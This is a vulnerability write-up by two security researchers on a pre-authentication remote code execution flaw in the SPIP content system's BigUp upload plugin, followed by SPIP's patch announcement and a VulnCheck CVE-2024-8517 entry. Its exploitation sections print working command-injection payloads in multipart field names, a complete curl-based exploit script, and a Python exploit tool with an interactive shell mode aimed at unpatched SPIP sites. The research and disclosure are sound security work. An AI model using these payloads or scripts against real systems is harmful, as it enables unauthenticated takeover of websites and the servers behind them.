The RCE for Laluka‚Äôs 1st challenge was in the code of the **‚ÄúPortePlume‚Äù** plugin, used to enhance Spip‚Äôs native textbox. This plugin had already been audited, and although there was still a very promising RCE sink, I‚Äôd gone over this plugin and wanted to discover some new code.
So I naturally decided to audit other plugins installed by default.

I started looking at the BigUp plugin code. It‚Äôs a plugin used this time for file uploading. It‚Äôs going to take care of saving the various uploaded images to disk, renaming them appropriately, handling big chunked uploads, and more.

The plugin is quite substantial:

```
.
‚îú‚îÄ‚îÄ action
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ bigup.php
‚îú‚îÄ‚îÄ balise
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ saisie_fichier.php
‚îú‚îÄ‚îÄ bigup_administrations.php
‚îú‚îÄ‚îÄ bigup_fonctions.php
‚îú‚îÄ‚îÄ bigup_pipelines.php
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ composer.json
‚îú‚îÄ‚îÄ css
‚îÇ¬†¬† [.. SNIPPED ..]
‚îú‚îÄ‚îÄ formulaires
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ configurer_bigup.html
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ tester_bigup_extended.html
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ tester_bigup_extended.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ tester_bigup.html
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ tester_bigup.php
‚îú‚îÄ‚îÄ genie
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ bigup_nettoyer_repertoire_upload.php
‚îú‚îÄ‚îÄ inc
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Bigup
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ CacheFichiers.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Cache.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ CacheRepertoire.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Files.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Flow.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Formulaire.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ GestionRepertoires.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Identifier.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ LogTrait.php
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Repondre.php
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Bigup.php
‚îú‚îÄ‚îÄ javascript
‚îÇ¬†¬† [.. SNIPPED ..]
‚îú‚îÄ‚îÄ lang
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup_ar.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup_de.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup_en.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup_fr.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup_pt_br.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bigup.xml
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ paquet-bigup_ar.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ paquet-bigup_de.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ paquet-bigup_en.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ paquet-bigup_fr.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ paquet-bigup_pt_br.php
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ paquet-bigup.xml
‚îú‚îÄ‚îÄ lib
‚îÇ¬†¬† [.. SNIPPED ..]
‚îú‚îÄ‚îÄ paquet.xml
‚îú‚îÄ‚îÄ phpcs.xml.dist
‚îú‚îÄ‚îÄ phpstan-baseline.neon
‚îú‚îÄ‚îÄ phpstan.neon.dist
‚îú‚îÄ‚îÄ prive
‚îÇ¬†¬† [.. SNIPPED ..]
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ saisies
‚îÇ¬†¬† [.. SNIPPED ..]
‚îî‚îÄ‚îÄ saisies-vues
    [.. SNIPPED ..]

```

Instead of spending time reading all the code, I started by researching dangerous behavior via [RegEx](https://fr.wikipedia.org/wiki/Expression_r%C3%A9guli%C3%A8re).

After several searches for dangerous functions: `eval`, `file_get_contents`, `system`‚Ä¶ as well as `arbitrary object instantiation` such as `$a($b) )` I finally found a suspicious function! ‚ò∫Ô∏è

## The vulnerable function

In the `plugins-dist/bigup/inc/Bigup/Files.php` file, on line *230* the *extraire\_fichiers\_valides* function contains the following code:

```
public static function extraire_fichiers_valides() {
    $liste = [];
    if (!count($_FILES)) {
        return $liste;
    }

    $infos = []; // name, pathname, error ‚Ä¶
    foreach ($_FILES as $racine => $descriptions) {
        $infos = array_keys($descriptions);
        break;
    }

    foreach ($_FILES as $racine => $descriptions) {
        $error = $descriptions['error'];

        // cas le plus simple : name="champ", on s'emb√™te pas
        if (!is_array($error)) {
            if ($error == 0) {
                $liste[$racine] = [$descriptions];
                unset($_FILES[$racine]);
            }
            continue;
        }

        // cas plus compliqu√©s :
        // name="champ[tons][][sous][la][pluie][]"
        // $_FILES[champ][error][tons][0][sous][la][pluie][0]
        else {
            $chemins = Files::extraire_sous_chemins_fichiers($error);

            foreach ($chemins['phps'] as $k => $chemin) {
                $var = '$_FILES[\'' . $racine . '\'][\'error\']' . $chemin;
                eval("\$error = $var;");

                if ($error == 0) {
                    $description = [];
                    foreach ($infos as $info) {
                        $var = '$_FILES[\'' . $racine . '\'][\'' . $info . '\']' . $chemin;
                        eval("\$x = $var; unset($var);");
                        $description[$info] = $x;
                    }

                    $complet = $racine . $chemins['names'][$k];
                    if (empty($liste[$complet])) {
                        $liste[$complet] = [];
                    }
                    $liste[$complet][] = $description;
                }
            }
        }
    }

    return $liste;
}

```
> Do you smel it? That smelly RCE smel? üëÄ

Indeed, a lot of eval is carried out!

Here‚Äôs the comments above the function read:

```
/**
 * Extrait et enl√®ve de `$_FILES` les fichiers re√ßus sans erreur
 * et cr√©e un tableau avec pour cl√© le champ d'origine du fichier
 *
 * @return array Tableau (champ => [description])
 */

```

The function seems to handle uploaded files, I didn‚Äôt have the courage to setup XDebug so a simple `echo` in the Docker logs will suffice for debugging.

It‚Äôs apparently used to pass from a path name to an array path. Why eval then?

So I added the following code at the start of the function, and displayed `$_FILES` to see what will pass through during uploads:

```
## Debug like a boss
error_log("######################################");
error_log("Call to extraire_fichiers_valides");
error_log(json_encode($_FILES));
error_log("######################################");

```

Plus we read this comment:

```
// cas plus compliqu√©s :
// name="champ[tons][][sous][la][pluie][]"
// $_FILES[champ][error][tons][0][sous][la][pluie][0]

```

To trigger the various EVALs, we need to send a file with the parameter `name` of the form *champ[tons][][sous][la][pluie][]*.
So you can navigate from the logged-in area to `/ecrire` and upload an image. Here I‚Äôm using the form to send a profile photo

I also added:

```
error_log($racine);
error_log($chemin);
$var = '$_FILES[\'' . $racine . '\'][\'error\']' . $chemin;
error_log($var);

```

![error_log](error_log.png)

Uploading an image sends 3 requests, 2 of which trigger the `extract_valid_files` function!

These two requests don‚Äôt contain the uploaded image, but they do reach our vulnerable code! üòÅ

```
POST /ecrire/?exec=auteur&id_auteur=1 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------35974249246826023222844215477
Content-Length: 1584
Origin: http://localhost:8000
Connection: keep-alive
Referer: http://localhost:8000/ecrire/?exec=auteur&id_auteur=1
Cookie: spip_session=1_d11b8a893cc1f545e2dee6e3e5ceb3ec; spip_admin=%40root%40root.root; spip_accepte_ajax=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue

-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="var_ajax"

form
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="exec"

auteur
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="id_auteur"

1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action"

editer_logo
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_args"

o7aLD55YnoVFatZHAGqAQwWZcL0Z6FaCfDb4yh9BlxHzEDHJjuuhj1zH/aQrCvgA3lRry1gAXIHgxJclaNiXP7J3xnoB+JE/twMTVpcmUQOczifhWzHFchZPDMxK0Sia4few939TklVQhnGYmdnbni4cOszvyb3ueOHYnGsiBda5GtVbmHwU3g4eAS/CgDM4SbQj5xvy0CLNKxbCbNL75db6W+NetjxgKlHBdLlpP8eiRnzNSd11MGmPqGezNBV+1CH5T/OUZkOfy2uKfo/WdwFGduql2JNpSUWmXLQY9RjR1ZwQredgR9E=
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_sign"

61e4242ff0083987cd3f876d5daa0a9ece8d7c772f4bb1f248ce3f4cb4bc9b47
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="bigup_retrouver_fichiers"

1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_verifier_json"

true
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="bigup_reinjecter_uniquement"

@28ef70ab@
-----------------------------35974249246826023222844215477--

```

![./log1](./log1.png)

You can immediately see that `$_FILES` is empty:

```
[Mon Sep  2 20:46:49 2024] ######################################
[Mon Sep  2 20:46:49 2024] Call to extraire_fichiers_valides
[Mon Sep  2 20:46:49 2024] []
[Mon Sep  2 20:46:49 2024] ######################################

```

So we can ask our best friend to add a file to our POST request:

![./gpt](./gpt.png)

And‚Ä¶ IT‚ÄôS A *small* WIN! We control the file passed to the function:

![code_triggered](code_triggered.png)

![meme_gpt](meme_gpt.png)

We can therefore adapt the `name` parameter with `[]`:

![first](first.png)

Here is an extract from logs:

```
[Mon Sep  2 21:41:54 2024] ######################################
[Mon Sep  2 21:41:54 2024] Call to extraire_fichiers_valides
[Mon Sep  2 21:41:54 2024] {"HELLO":{"name":{"WORLD":"example.txt"},"full_path":{"WORLD":"example.txt"},"type":{"WORLD":"text\/plain"},"tmp_name":{"WORLD":"\/tmp\/phpB6Hmiq"},"error":{"WORLD":0},"size":{"WORLD":38}}}
[Mon Sep  2 21:41:54 2024] ######################################
[Mon Sep  2 21:41:54 2024] HELLO
[Mon Sep  2 21:41:54 2024] ['WORLD']
[Mon Sep  2 21:41:54 2024] $_FILES['HELLO']['error']['WORLD']

```

The last 3 lines correspond to `$racine` `$chemin` and `$var`.

`$var` corresponds to the string that will be evaluated next, passing *‚ÄúHELLO[WORLD]‚Äù*, here‚Äôs the string formed:

```
$_FILES['HELLO']['error']['WORLD']

```

The complete code evaluated will therefore be:

```
$error = $_FILES['HELLO']['error']['WORLD'];

```
## Remote Code Execution

> What happens if I send a single quote? ü§î

Response: **The server returns a 500 error!**

![500](500.png)

From the docker logs, we can read:

![500_log](500_log.png)

Here we see that the `'` is not filtered, so the context is broken and the call to *eval* returns an error.

Finally, we can add a real payload to control the contents of the string between the square brackets.

The payload payload `HELLO[AB'.strval(5+5).'CD]` lead to this log line:

```
Undefined array key "AB10CD" in ... plugins-dist/bigup/inc/Bigup/Files.php(276) : eval()'d code on line 1

```

The rce is now trivial, with the following payload:

```
name="HELLO[AB'.system('id').die().'CD]"

```

![rce](rce.png)

![win2](win2.png)

My first reaction was like

![lalu](lalu.png)

But in the end he confirmed that he didn‚Äôt have it in his notes!

If you‚Äôre curious, this was related to my [teasing tweet](https://x.com/Vozec1/status/1822647021733281895) from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep track & proofs).

```
[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
9fd0828be2a9d90e89e226f1fcd6d5d9  -

```
## Additional note:

The vulnerability can also be triggered in the first part of the name parameter:

```
name="RCE'-system('id')-'[ABCD]"

```

The dot is filtered, but you can use `sprintf` to call the `die` function after the `system` to avoid an error in logs:

```
name="RCE'-sprintf(system('id'),die())-'[ABCD]"

```

![isok](isok.png)

---

Hello, Laluka here! üëã

I‚Äôll take the next part that makes this lovely post-auth RCE pre-auth! üòâ

## Making the RCE Pre-Auth

Once Vozec showed me that his issue was related to file upload, and required a form to submit, I had two thoughts:

* First, we might get lucky, maybe the code path is reached with any form?
* Second, if we‚Äôre unlucky, we‚Äôll have to find another path!

So, here‚Äôs the flow:
- `extraire_fichiers_valides()` from `plugins-dist/bigup/inc/Bigup/Files.php`, called by
- `gerer_fichiers_postes()` within `plugins-dist/bigup/inc/Bigup.php`, called by
- `bigup_formulaire_receptionner($flux)` within `plugins-dist/bigup/bigup_pipelines.php`

I stopped there, as the pipelining system behaves in a ‚Äúglobal‚Äù way, -close to- every pass through it, so let‚Äôs ‚Äúassume‚Äù we‚Äôre lucky, and hit right away!

The code only passes through the right code path if a specific parameter is present, so let‚Äôs add it! (i.e. `bigup_retrouver_fichiers=foo`)

```
/**
 * Branchement sur la r√©ception d'un formulaire (avant verifier())
 *
 * On remet `$_FILES` avec les fichiers pr√©sents pour ce formulaire,
 * et avant que la fonction verifier native du formulaire soit utilis√©e,
 * de sorte qu'elle ait acc√®s √† $_FILES rempli.
 *
 * @pipeline formulaire_receptionner
 * @param array $flux
 * @return array
 */
function bigup_formulaire_receptionner($flux) {
	if (_request('bigup_retrouver_fichiers')) {
		$bigup = bigup_get_bigup($flux);
		$bigup->gerer_fichiers_postes(); // les fichiers post√©s sans JS
		$liste = $bigup->reinserer_fichiers(_request('bigup_reinjecter_uniquement'));
		$bigup->surveiller_fichiers($liste);
	}
	return $flux;
}

```
> Note the `Branchement sur la r√©ception d'un formulaire (avant verifier())` in the comment, clearly stating that all this logic (including eval) will take place before the verification/validation steps take place.. üòÖ

From there, I took one page that is almost always present, the ‚Äúforgotten password‚Äù one!

* <http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr>

What I wanted to have in the request, is the `formulaire_action_args` protected and encoded variable at hand:

* I want to submit a `form`, therefore requiring `formulaire_action_args`
* With extra ‚Äúfiles‚Äù (our RCE payload)
* With our extra `bigup_retrouver_fichiers` param to enable the bigup part!

![formulaire_action_args](formulaire_action_args.png)

Any extra steps? Nope! It worked right away! üçÄ

## Unauth Spip RCE Final Exploit

As a script, this gives us the following concise exploit:

```
echo foo > foo.txt
cmd="id; date"
formulaire_action_args=$(curl -k 'http://127.0.0.1:8000/spip.php?page=spip_pass&lang=fr' | grep -F formulaire_action_args -C 3 | grep -ioP '[0-9a-zA-Z_/=+]{30,}')
echo "formulaire_action_args: $formulaire_action_args"
formulaire_action_args_encoded=$(python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))" "$formulaire_action_args")
echo "formulaire_action_args_encoded: $formulaire_action_args_encoded"
base_url="http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr&page=spip_pass&lang=fr"
final_payload="formulaire_action=oubli&formulaire_action_args=$formulaire_action_args_encoded&formulaire_action_sign=&oubli=foo%40foo.foo&nobot=&bigup_retrouver_fichiers=1"
curl -ki -X POST -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt" "$base_url&$final_payload"

```

![unauth-spip-rce](unauth-spip-rce.png)

Vozec also made a python script for the same bug:

```
#!/bin/env python3
import argparse
import requests
import re
import io
import readline
from urllib.parse import unquote
from bs4 import BeautifulSoup
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3

urllib3.disable_warnings()

class exploit:
    def __init__(self, args) -> None:
        self.url = args.target
        self.s = requests.session()

    def get_tokens(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Accept": "*/*",
            "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
        r = requests.Request(
            url=url,
            method="GET",
            headers=headers,
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=False).text
        soup = BeautifulSoup(r, "html.parser")
        token = soup.find("input", {"name": "formulaire_action_args"})["value"]
        return token

    def exploit(self, cmd):
        token = self.get_tokens()
        mp_encoder = MultipartEncoder(
            fields={
                "page": "spip_pass",
                "lang": "fr",
                "formulaire_action": "oubli",
                "formulaire_action_args": token,
                "formulaire_action_sign": "",
                "oubli": "abc@gmail.com",
                "nobot": "",
                "bigup_retrouver_fichiers": "a",
                f"RCE['.system('{cmd}').die().']": (
                    "abc.txt",
                    io.BytesIO(b"Hello"),
                    "text/plain",
                ),
            }
        )
        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
        r = requests.Request(
            url=url,
            method="POST",
            data=mp_encoder,
            headers={"Content-Type": mp_encoder.content_type},
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=False)
        return r.text.strip()

def get_args():
    parser = argparse.ArgumentParser(description="RCE Spip <= 4.3.1")
    parser.add_argument(
        "-t", "--target", type=str, required=True, help="Target Url (ex: http://)"
    )
    parser.add_argument(
        "-c", "--cmd", type=str, required=False, help="Shell command to execute"
    )
    parser.add_argument(
        "-s", "--shell", action="store_true", help="Semi interactive shell"
    )
    args = parser.parse_args()
    return args

def main():
    args = get_args()
    x = exploit(args)
    if args.cmd:
        res = x.exploit(args.cmd)
        print(res)

    if args.shell:
        while 1:
            r = x.exploit(input("$ "))
            print(r)

if __name__ == "__main__":
    main()

"""
[~/Desktop/autre]$ python3 0day_rce_spip.py -t http://localhost:8000 -c id
uid=1000(vozec) gid=1000(vozec) groupes=1000(vozec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),995(input)

[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
9fd0828be2a9d90e89e226f1fcd6d5d9  -
"""

```
## Closing Words

Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing‚Ä¶ üôÉ

> Nailed it! üòé

![rce-rootme-acknowledgement](rce-rootme-acknowledgement.png)

---

As always, we hope you‚Äôve had a nice time reading our adventures! üßô

Feel free to follow both of us for future challenges & cool reads! üíù

![lalu-and-vozec](lalu-and-vozec.png)

[Spip Preauth RCE 2024: Part 1, The Feather](/hacking/spip_preauth_rce_2024_part_1_the_feather/)



=== Content from blog.spip.net_9350bc00_20250111_102958.html ===

**[![](local/cache-vignettes/L96xH96/siteon0-47b07.png?1666949430)SPIP Blog](https://blog.spip.net/ "Accueil")**

Du logiciel libre et de la tendresse

* [Gazette](-Gazette-.html)
* [Release](-Release-.html)
* [D√©veloppement](-Developpement-.html)
* [Communaut√©](-Communaute-.html)
* [Ailleurs](-Ailleurs-.html)

[Accueil](https://blog.spip.net/) > [Release](-Release-.html) > **Mise √† jour critique de s√©curit√©¬†: sortie de SPIP¬†4.3.2, SPIP¬†4.2.16, SPIP¬†(‚Ä¶)**

# Mise √† jour critique de s√©curit√©¬†: sortie de SPIP¬†4.3.2, SPIP¬†4.2.16, SPIP¬†4.1.18

mardi 20 ao√ªt 2024, par [L‚Äô√©quipe maintenance](_L-equipe-maintenance_.html)

Suite au signalement d‚Äôune faille critique de s√©curit√©, qui affecte toutes les versions de SPIP depuis la 4.0, nous publions les versions SPIP¬†4.3.2, SPIP¬†4.2.16, SPIP¬†4.1.18. Un grand merci √† Laluka (Jacques-Chevallier Louka) et Vozec (Arthur Deloffre) pour le signalement.

Ces versions corrigent une faille critique permettant l‚Äôex√©cution de code (RCE) depuis l‚Äôespace public sur les branches 4.1, 4.2 et 4.3 de SPIP.

Il est imp√©ratif de mettre √† jour votre site SPIP **imm√©diatement**.

Encore une fois, merci √† Laluka (Jacques-Chevallier Louka) et Vozec (Arthur Deloffre) pour l‚Äôanalyse compl√®te et d√©taill√©e transmise.

**Cette faille est prise en charge par l‚Äô√©cran de s√©curit√©**, voir [la documentation sur spip.net](https://www.spip.net/fr_article4200.html).

La faille **concerne aussi les branches non maintenues de SPIP**, notamment SPIP4.0, qui utilisent le plugin bigup. Vous pouvez s√©curiser ces sites √† l‚Äôaide de la derni√®re version de l‚Äô√©cran de s√©curit√©. Comme toujours, il est fortement recommand√© de mettre √† jour vers une version maintenue de SPIP.

En plus de la correction de la faille de s√©curit√©, la version 4.3.2 apporte les am√©liorations ou corrections de bugs suivantes.

## SPIP¬†4.3.2

* S√©curit√©
  + Mise √† jour de l‚Äô√©cran de s√©curit√© en version 1.6.3
  + N√©cessiter un jeton valide (un formulaire demandant bigup) pour activer la recherche de fichiers dans `$_FILES`
  + Refactor de l‚Äôanalyse de `$_FILES`
* Changements
  + Revert du calcul automatique des cha√Ænes de langue du menu Cr√©er du bandeau de l‚Äôespace priv√©
* Corrections
  + G√©n√©rer des contenus √©ditoriaux aussi compatibles XHTML (sur `br` et `img`)
  + Afficher aussi dans l‚Äôespace priv√© le tableau des requ√™tes du mode `var_profile=1`
  + Modifier les cha√Ænes de langues utilis√©es pour les objets d√©clar√©s dans le menu Cr√©er (article, rubrique, auteur)
## Mettre √† jour en utilisant le spip\_loader

Vous pouvez aussi mettre √† jour au moyen de la derni√®re version de spip\_loader (**version¬†6.1.7**).

**spip\_loader** est distribu√© √† l‚Äôadresse suivante¬†:
<https://get.spip.net/>

Le fichier `spip_loader.php` est un script compil√© dans le format binaire
[phar](https://www.php.net/manual/fr/intro.phar.php).
Si vous avez besoin de personnaliser l‚Äôinstallation en d√©finissant des constantes, il vous faut cr√©er un fichier de configuration spip\_loader\_config.php (cf <https://www.spip.net/fr_article5705.html>).

## R√©sum√© des versions de SPIP

| Branche | Version | Suivi | Compatibilit√© PHP |
| --- | --- | --- | --- |
| SPIP¬†4.3 | [4.3.2](https://files.spip.net/spip/archives/spip-v4.3.2.zip) | Maintenance active | PHP¬†7.4¬†√†¬†PHP¬†8.4 |
| SPIP¬†4.2 | [4.2.16](https://files.spip.net/spip/archives/spip-v4.2.16.zip) | Correctifs de s√©curit√© | PHP¬†7.4¬†√†¬†PHP¬†8.3 |
| SPIP¬†4.1 | [4.1.18](https://files.spip.net/spip/archives/spip-v4.1.18.zip) | Correctifs de s√©curit√© | PHP¬†7.4¬†√†¬†PHP¬†8.1 |

Pour conna√Ætre le d√©tail des versions maintenues :

<https://www.spip.net/fr_article6500.html>
## Comment √™tre tenu au courant de ces annonces¬†?

C‚Äôest simple, inscrivez-vous sur la mailing liste
<https://discuter.spip.net/c/spip-ann/13>

Bien s√ªr, les r√©seaux sociaux sont de la partie¬†:

* Seenthis¬†: <https://seenthis.net/people/spip>
* Facebook¬†: <https://www.facebook.com/spip.net>
* Mamot¬†: [https://mamot.fr/@spip](https://mamot.fr/%40spip)
## Une question, besoin d‚Äôaide¬†?

En cas de probl√®me ou de difficult√©s, il y aura certainement quelqu‚Äôun pour vous aider sur IRC,
n‚Äôh√©sitez pas √† venir poser vos questions <https://irc.spip.net>
ou sur [notre serveur Discord](https://discord.gg/bFFgVz2).

Vous pouvez aussi poster un message et √©changer sur¬†:

* La liste des utilisateurs et utilisatrices <https://discuter.spip.net/c/spip/6>
* La liste du d√©veloppement spip-dev <https://discuter.spip.net/c/spip-dev/5>

Nous vous rappelons que pour signaler une faille, il suffit d‚Äôenvoyer un mail √†
securite@spip.net.

## Messages

* [22 ao√ªt 2024, 14:43, par Laurent](#forum6446 "Lien permanent vers le commentaire 6446")

  Bonjour,

  Malgr√© l‚Äôinstallation de spip\_loader.php avec la derni√®re version et en cliquant sur Mettre √† jour s‚Äôaffichant dans la fen√™tre o√π est indiqu√© ¬´¬†La mise √† jour 4.3.2 de SPIP est disponible¬†¬ª, le r√©sultat est.... ¬´¬†Le chargement a √©chou√©. Veuillez r√©essayer ou utiliser l‚Äôinstallation manuelle.¬†¬ª Je fais quoi docteur¬†?¬†:-)

  Dans l‚Äôattente....
* [22 ao√ªt 2024, 14:51, par b\_b](#forum6447 "Lien permanent vers le commentaire 6447")

  @Laurent, tu passes en discuter sur <https://discuter.spip.net/c/spip/6>¬†;)
* [23 ao√ªt 2024, 08:30, par Kamran](#forum6448 "Lien permanent vers le commentaire 6448")

  Error

  Spip Loader (6.1.7)

  Can‚Äôt open archive ¬´¬†spip-v4.3.2.zip¬†¬ª with ZipArchive
* [23 ao√ªt 2024, 12:42, par James](#forum6449 "Lien permanent vers le commentaire 6449")

  Hello @kamran.

  As for Laurent, please go to <https://discuter.spip.net/c/spip/6>¬†!
* [20 septembre 2024, 17:43, par Mister X](#forum6451 "Lien permanent vers le commentaire 6451")

  20 ans de SPiP et je me suis fais exploit/er pour la premi√®re fois avec cette faille¬†:(

  Il y a des robots qui ont int√©gr√©es les derni√®res failles critiques de SPiP, c‚Äôest la premi√®re fois que je le vois dans mes logs depuis que je g√®re mes serveurs¬†15 ans.

  Merci pour la mise √† jour.

Rechercher¬†:

## Dans la m√™me rubrique

* [Mise √† jour de maintenance¬†: sortie de SPIP 4.3.5](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-5.html)
* [Mise √† jour de maintenance¬†: sortie de SPIP 4.3.4](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-4.html)
* [Mise √† jour de maintenance¬†: sortie de SPIP 4.3.3](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-3.html)
* [Mise √† jour critique de s√©curit√©¬†: sortie de SPIP¬†4.3.2, SPIP¬†4.2.16, SPIP¬†4.1.18](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [Mise √† jour de maintenance¬†: sortie de SPIP 4.3.1](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-1.html)
* [Sortie de SPIP¬†4.3.0](Sortie-de-SPIP-4-3-0.html)
* [Mise √† jour de maintenance et s√©curit√©¬†: ‚ÄØsortie de SPIP¬†4.2.15](Mise-a-jour-de-maintenance-et-securite-sortie-de-SPIP-4-2-15.html)
* [Sortie de SPIP¬†4.3.0-beta](Sortie-de-SPIP-4-3-0-beta.html)
* [Mise √† jour de maintenance¬†: sortie de SPIP¬†4.2.14, SPIP¬†4.1.17](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-2-14-SPIP-4-1-17.html)
* [Mise √† jour critique de s√©curit√©¬†: sortie de SPIP¬†4.3.0-alpha2, SPIP¬†4.2.13, SPIP¬†4.1.16](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html)

2005 - 2025 SPIP Blog

[![SPIP](spip.png)](https://www.spip.net/ "Site r√©alis√© avec SPIP")



=== Content from vulncheck.com_780b65c0_20250111_103000.html ===

## Cookies

We use our own cookies and third-party cookies so that we can display this website correctly and better understand how this website is used, with a view to improving the services we offer. A decision on cookie usage permissions can be changed anytime using the cookie button that will appear after a selection has been made on this banner.

AcceptDeclineLearn more and customize[Products](/product)[Government](/government)Resources[Community](/community)Open Source[Company](/company)Go back

SPIP Bigup Multipart File Upload Command Injection

severitycriticaldateSeptember 6, 2024Affecting

* 4.3.0 - 4.3.1
* 4.2.0 - 4.2.15
* Before 4.1.18

CVECVE-2024-8517CVE typeReliance on File Name or Extension of Externally-Supplied FileCVSS9.8CVSS V3 VectorAV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:HReferences

* [Advisory](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [Exploit Description](https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/)

CreditLouka Jacques-ChevallierFooterVulnCheck helps organizations outpace adversaries with vulnerability intelligence that predicts avenues of attack with speed and accuracy.¬© 2025 VulnCheck Inc.Products

* [Exploit & Vulnerability Intelligence](/product/exploit-intelligence)
* [Initial Access Intelligence](/product/initial-access-intelligence)
* [IP Intelligence](/product/ip-intelligence)
* [VulnCheck for Government](/government)

Resources

* [Documentation](https://docs.vulncheck.com/)
* [API](https://docs.vulncheck.com/api)
* [Changelog](https://docs.vulncheck.com/changelog)
* [Glossary](https://docs.vulncheck.com/glossary/terms)
* Contact Support

Community

* [VulnCheck KEV](/kev)
* [NVD++](/nvd2)
* [XDB](/xdb)
* [Knowledge Base](/blog?tags=101)
* [Report a Vulnerability](/advisories/report)

Open Source

* [SDK for Go](https://github.com/vulncheck-oss/sdk-go)
* [SDK for Python](https://github.com/vulncheck-oss/sdk-python)
* [CLI](https://github.com/vulncheck-oss/cli)
* [GitHub Action](https://github.com/vulncheck-oss/action)
* [go-exploit](https://github.com/vulncheck-oss/go-exploit)

Company

* [Blog](/blog)
* [News and Awards](/news)
* [Press Releases](/press)
* [Partners](/partners)
* [Events](/events)
* [VulnCheck Advisories](/advisories)
* [Leadership Team](/company/about)

Legal

* [Privacy Policy](/privacy)
* [Terms & Conditions](/terms)
* [Vulnerability Disclosure Policy](/vulnerability-disclosure-policy)


